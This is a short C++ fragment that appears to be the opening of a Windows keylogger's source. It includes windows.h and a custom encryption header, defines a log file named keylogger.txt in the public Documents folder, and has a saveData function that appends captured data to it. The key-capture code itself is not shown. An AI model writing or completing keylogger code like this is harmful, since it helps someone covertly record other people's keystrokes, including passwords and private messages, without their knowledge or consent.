#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <sys/stat.h>
#include "encrypt.h"

#define LOG_FILE "C:\\Users\\Public\\Documents\\keylogger.txt"

void saveData(std::string data){
    std::fstream logFile;

    logFile.open(LOG_FILE, std::ios::app);

    logFile << data;

    logFile.close();
}